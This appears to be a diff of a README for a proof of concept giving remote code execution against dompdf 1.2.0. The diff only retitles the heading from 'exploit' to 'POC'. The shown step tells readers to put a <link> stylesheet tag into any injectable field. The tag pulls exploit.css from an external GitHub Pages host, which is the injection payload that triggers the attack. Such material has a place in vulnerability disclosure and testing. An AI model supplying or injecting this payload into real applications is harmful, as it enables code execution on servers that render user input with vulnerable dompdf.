@@ -1,4 +1,4 @@
-# Live RCE exploit for dompdf 1.2.0
+# Live RCE POC for dompdf 1.2.0
 
 1. Use the following <link> tag in any injectable field: 
    - `<link rel=stylesheet href='https://abhishekg999.github.io/dompdf/exploit.css'>`
